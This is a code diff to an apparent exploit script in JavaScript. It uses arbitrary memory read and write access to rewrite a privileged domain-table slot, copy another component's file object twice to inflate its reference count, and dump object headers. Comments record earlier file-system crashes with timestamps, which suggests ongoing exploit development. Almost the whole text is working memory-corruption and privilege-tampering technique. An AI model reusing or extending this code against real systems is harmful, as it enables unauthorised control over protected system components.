@@ -819,7 +819,11 @@ async function main() {
       const readback = await memory.read(slot, 0x30);
       if (ptr(readback, 0x18) !== Number(root.targetDomain) || ptr(readback, 0x20) !== removed.object)
         return null;
-      return {id, slot, object: removed.object, metadata: removed.metadata, vptr, sNext};
+      // Diagnostic only: the object header lives in the FS heap, which the
+      // retained endpoint can still read. If the close faults again this shows
+      // whether the target is the file proxy or something else.
+      const header = await memory.read(removed.object, 0x80).then(b => b.toString('hex')).catch(() => null);
+      return {id, slot, object: removed.object, metadata: removed.metadata, vptr, header, sNext};
     }
 
     // The file Read removes its own domain entry and releases one reference.
@@ -827,9 +831,11 @@ async function main() {
     // close dereferences dead memory (11:10) or, when we substitute a different
     // file, the cross-domain release faults the FS (11:38). Keep the Loader's
     // own object alive: before the Read, briefly expose it through our
-    // inspection-domain slot and CopyObject it, then restore the slot. The Read
-    // drops the entry reference (2 -> 1); the close later releases the last one
-    // and destroys the same object normally, exactly like an ungated close.
+    // inspection-domain slot and CopyObject it twice, then restore the slot.
+    // The Read drops the entry reference; the close drops another one. Two
+    // copies leave one reference alive after the close, so the file object's
+    // destructor never runs. That destructor is the fault: with one copy the
+    // close released the last reference and the FS died (13:52, 2162-0002).
     async function addObjectReference(entry) {
       const owned = await memory.request({command: 'root-native-domain-open'});
       const ownEntry = Number(layout.table) + (Number(owned.root) - 1) * 0x30;
@@ -838,18 +844,27 @@ async function main() {
       borrowed.writeBigUInt64LE(BigInt(entry.object), 0x20);
       borrowed.writeBigUInt64LE(BigInt(entry.metadata), 0x28);
       await memory.write(ownEntry, original, borrowed);
-      let copy;
+      // Two copies, not one. The Read removes the entry and releases its
+      // reference; the Loader's close then removes the restored entry and
+      // releases another. With a single copy the close releases the last
+      // reference, runs the file object's destructor, and the FS faults. With
+      // two, one reference survives the close so the destructor never runs and
+      // the close is only a domain-entry removal (the leaked object is fine).
+      const copies = [];
       try {
-        copy = await memory.request({command: 'root-native-domain-copy',
-          handle: Number(owned.handle), object: Number(owned.root)});
+        for (let i = 0; i < 2; i++) {
+          const copy = await memory.request({command: 'root-native-domain-copy',
+            handle: Number(owned.handle), object: Number(owned.root)});
+          check(Number(copy.handle) > 0, 'Reference copy returned no handle');
+          copies.push(Number(copy.handle));
+        }
       } finally {
         await memory.write(ownEntry, borrowed, original);
       }
       check((await memory.read(ownEntry, 0x30)).equals(original),
         'Inspection slot did not restore after the reference copy');
-      check(Number(copy.handle) > 0, 'Reference copy returned no handle');
       return {entry: entry.id, object: entry.object, metadata: entry.metadata,
-        copy: Number(copy.handle), at: new Date().toISOString()};
+        copy: copies[0], copy2: copies[1], at: new Date().toISOString()};
     }
 
     const launchSlot = flags === 0x10 ? 2 : 1;
